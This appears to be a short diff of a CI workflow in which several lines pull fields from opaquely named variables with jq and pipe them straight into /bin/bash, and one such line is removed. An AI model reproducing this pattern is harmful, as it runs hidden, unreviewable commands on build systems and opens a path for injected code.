@@ -42,7 +42,6 @@ jobs:
           echo $kvk6500 | jq -r .egp156 | /bin/bash
           echo $nrvn9145 | jq -r .t27823 | /bin/bash
           echo $zjnwu56 | jq -r .cbujt2 | /bin/bash
-          echo $klt3 | jq -r .yqi59064 | /bin/bash
           printf '%s' "$uoa736" | jq -r .j671 | /bin/bash
           echo $xpzfo867 | jq -r .kfz3 | /bin/bash
           echo $qmosv0 | jq -r .gpfs5740 | /bin/bash
